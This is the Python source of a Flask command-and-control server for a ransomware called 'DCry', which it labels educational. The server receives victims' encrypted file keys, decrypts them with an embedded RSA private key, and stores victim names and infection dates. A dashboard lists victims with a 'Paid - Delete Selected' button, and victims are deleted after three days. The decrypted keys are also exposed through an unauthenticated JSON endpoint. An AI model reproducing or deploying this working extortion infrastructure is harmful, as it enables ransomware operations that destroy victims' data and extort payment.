################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
# research, ethical hacking education, and malware analysis training only.
# It mimics the behavior of real ransomware but must NOT be used for illegal or
# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
# under the supervision of cybersecurity professionals.
# The authors assume no liability for any misuse or damage caused.

import base64
import os
import re
import shutil
from datetime import datetime, timedelta

from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from flask import (Flask, flash, jsonify, redirect, render_template_string,
                   request, url_for)
from flask_httpauth import HTTPBasicAuth
from flask_wtf.csrf import CSRFProtect
from markupsafe import escape as flask_escape

RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----""" # Replace with your private key if needed

app = Flask(__name__)
auth = HTTPBasicAuth()
users = {"dcry_admin": "dcry-ransomware-poc"}
app.config["SECRET_KEY"] = "dcry-ransomware-poc"
csrf = CSRFProtect(app)

VICTIM_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))
os.makedirs(VICTIM_FOLDER, exist_ok=True)


def decrypt_key(encrypted_key):
    private_key = RSA.import_key(RSA_PRIVATE_KEY)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    return cipher_rsa.decrypt(encrypted_key)


def sanitize_path_component(component):
    if not component:
        return "_"
    component = re.sub(r"[^a-zA-Z0-9_-]", "_", component)
    if component in [".", ".."]:
        return "_"
    return component


def is_safe_path(victim_id):
    base_dir = os.path.abspath(VICTIM_FOLDER)
    victim_path = os.path.join(base_dir, victim_id)
    return os.path.commonprefix([os.path.abspath(victim_path), base_dir]) == base_dir


def victim_is_expired(date_str, days_valid=3):
    try:
        infected_date = datetime.strptime(date_str, "%Y-%m-%d")
        return datetime.now() > infected_date + timedelta(days=days_valid)
    except Exception:
        return False


def delete_victim(victim_id):
    path = os.path.join(VICTIM_FOLDER, victim_id)
    if os.path.isdir(path):
        try:
            shutil.rmtree(path)
            app.logger.info(f"Successfully deleted victim folder: {path}")
            return True
        except Exception as e:
            app.logger.error(f"Error deleting folder {path}: {e}")
            return False
    return False


def get_victims_data():
    victims_data = []
    try:
        for vid in os.listdir(VICTIM_FOLDER):
            if not is_safe_path(vid):
                continue

            vid_safe = sanitize_path_component(vid)
            if not vid_safe or vid_safe == "_":
                continue

            folder = os.path.join(VICTIM_FOLDER, vid_safe)
            info_path = os.path.join(folder, "info.txt")
            key_path = os.path.join(folder, "key.txt")

            if not os.path.isfile(info_path) or not os.path.isfile(key_path):
                continue

            try:
                info = {
                    k: v
                    for line in open(info_path, "r")
                    if "=" in line
                    for k, v in [line.strip().split("=", 1)]
                }

                if victim_is_expired(info.get("date", ""), 3):
                    delete_victim(vid_safe)
                    continue

                with open(key_path, "r") as f:
                    key = f.read()

                victims_data.append(
                    {
                        "username": flask_escape(info.get("username", "")),
                        "id": flask_escape(vid_safe),
                        "date": flask_escape(info.get("date", "")),
                        "key": flask_escape(key),
                    }
                )
            except Exception as e:
                app.logger.error(f"Error reading data for {vid_safe}: {e}")
                continue
    except Exception as e:
        app.logger.error(f"Error listing victims: {e}")
    return victims_data


@app.route("/delete_victim", methods=["POST"])
def delete_victim_route():
    victim_ids = request.form.getlist("victim_ids")
    if not victim_ids:
        flash("No items were selected for deletion.", "warning")
        return redirect(url_for("dashboard"))

    deleted_count, failed_count = 0, 0
    for victim_id in victim_ids:
        sanitized_id = sanitize_path_component(victim_id)
        if not sanitized_id or sanitized_id == "_" or not is_safe_path(sanitized_id):
            app.logger.warning(f"Skipping invalid or unsafe victim ID: {victim_id}")
            failed_count += 1
            continue
        if delete_victim(sanitized_id):
            deleted_count += 1
        else:
            failed_count += 1

    if deleted_count > 0:
        flash(f"Successfully deleted {deleted_count} selected item(s).", "success")
    if failed_count > 0:
        flash(f"Failed to delete {failed_count} item(s).", "danger")

    return redirect(url_for("dashboard"))


@app.route("/upload", methods=["POST"])
@csrf.exempt
def upload():
    username = request.form.get("username", "")
    vid_raw = request.form.get("id", "")
    date = request.form.get("date", "")
    key = request.form.get("key", "")
    vid = sanitize_path_component(vid_raw)
    if not vid or vid == "_":
        return "Invalid victim ID.", 400
    if not is_safe_path(vid):
        return "Path Traversal attempt detected.", 400

    folder = os.path.join(VICTIM_FOLDER, vid)
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, "info.txt"), "w") as f:
        f.write(f"username={username}\n")
        f.write(f"date={date}\n")
    try:
        decrypted_key = decrypt_key(base64.b64decode(key))
        with open(os.path.join(folder, "key.txt"), "wb") as f:
            f.write(decrypted_key)
    except Exception as e:
        return f"Key decryption failed: {e}", 400
    return "Upload success."


@app.route("/dashboard-data")
def dashboard_data():
    victims = get_victims_data()
    return jsonify(victims)


@auth.verify_password
def verify_password(username, password):
    if username in users and users[username] == password:
        return username


@app.route("/dashboard")
@auth.login_required
def dashboard():
    victims_data = get_victims_data()
    html = """
<!DOCTYPE html>
<html lang="vi" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DCry Victims Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style> body { padding: 1.5rem; } .container h1 { margin-bottom: 1.5rem; } </style>
</head>
<body>
    <div class="container">
        <div class="d-flex justify-content-between align-items-center mb-3">
            <h1>DCry Victims Dashboard</h1>
        </div>
        <div class="mb-3">
            <input type="text" id="searchInput" class="form-control" placeholder="Search by Username or ID...">
        </div>
        <form method="post" action="{{ url_for('delete_victim_route') }}" onsubmit="return confirm('Are you sure you want to delete the selected victims?');">
            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
            <div class="table-responsive">
                <table class="table table-hover table-bordered align-middle">
                    <thead class="table-light">
                        <tr>
                            <th scope="col" class="text-center" style="width: 5%;"><input class="form-check-input" type="checkbox" id="selectAllCheckbox"></th>
                            <th scope="col">Username</th>
                            <th scope="col">ID</th>
                            <th scope="col">Infected Date</th>
                            <th scope="col">Key</th>
                        </tr>
                    </thead>
                    <tbody id="victimsTableBody">
                    {% for v in victims %}
                        <tr>
                            <td class="text-center"><input class="form-check-input" type="checkbox" name="victim_ids" value="{{ v.id }}"></td>
                            <td>{{ v.username }}</td>
                            <td><code>{{ v.id }}</code></td>
                            <td>{{ v.date }}</td>
                            <td><code>{{ v.key }}</code></td>
                        </tr>
                    {% endfor %}
                    </tbody>
                </table>
            </div>
            <button type="submit" class="btn btn-danger mt-3">Paid - Delete Selected</button>
        </form>
    </div>
    
    <div class="toast-container position-fixed bottom-0 end-0 p-3" style="z-index: 1100">
        {% with messages = get_flashed_messages(with_categories=true) %}
        {% if messages %}
            {% for category, message in messages %}
            <div class="toast align-items-center text-bg-{{ category }} border-0" role="alert" aria-live="assertive" aria-atomic="true">
                <div class="d-flex">
                    <div class="toast-body">{{ message }}</div>
                    <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
                </div>
            </div>
            {% endfor %}
        {% endif %}
        {% endwith %}
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        async function updateTable() {
            try {
                const response = await fetch('/dashboard-data');
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                const victims = await response.json();
                const tableBody = document.getElementById('victimsTableBody');
                
                const checkedIds = new Set();
                tableBody.querySelectorAll('input[type="checkbox"]:checked').forEach(cb => {
                    checkedIds.add(cb.value);
                });
                
                tableBody.innerHTML = '';

                victims.forEach(v => {
                    const isChecked = checkedIds.has(v.id) ? 'checked' : '';
                    const rowHtml = `
                        <tr>
                            <td class="text-center">
                                <input class="form-check-input" type="checkbox" name="victim_ids" value="${v.id}" ${isChecked}>
                            </td>
                            <td>${v.username}</td>
                            <td><code>${v.id}</code></td>
                            <td>${v.date}</td>
                            <td><code>${v.key}</code></td>
                        </tr>
                    `;
                    tableBody.insertAdjacentHTML('beforeend', rowHtml);
                });
                
                document.getElementById('searchInput').dispatchEvent(new Event('keyup'));

            } catch (error) {
                console.error("Failed to update victim data:", error);
            }
        }

        setInterval(updateTable, 3000);
        
        document.getElementById('selectAllCheckbox').addEventListener('click', function(event) {
            const victimCheckboxes = document.querySelectorAll('#victimsTableBody input[type="checkbox"]');
            for (const checkbox of victimCheckboxes) {
                if (checkbox.closest('tr').style.display !== 'none') {
                    checkbox.checked = event.target.checked;
                }
            }
        });

        document.getElementById('searchInput').addEventListener('keyup', function() {
            const filter = this.value.toLowerCase();
            const rows = document.getElementById('victimsTableBody').getElementsByTagName('tr');
            for (const row of rows) {
                const usernameCell = row.cells[1].textContent.toLowerCase();
                const idCell = row.cells[2].textContent.toLowerCase();
                if (usernameCell.includes(filter) || idCell.includes(filter)) {
                    row.style.display = "";
                } else {
                    row.style.display = "none";
                }
            }
        });

        document.addEventListener('DOMContentLoaded', (event) => {
            const toastElList = document.querySelectorAll('.toast');
            const toastList = [...toastElList].map(toastEl => new bootstrap.Toast(toastEl).show());
        });
    </script>
</body>
</html>
    """
    return render_template_string(html, victims=victims_data)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
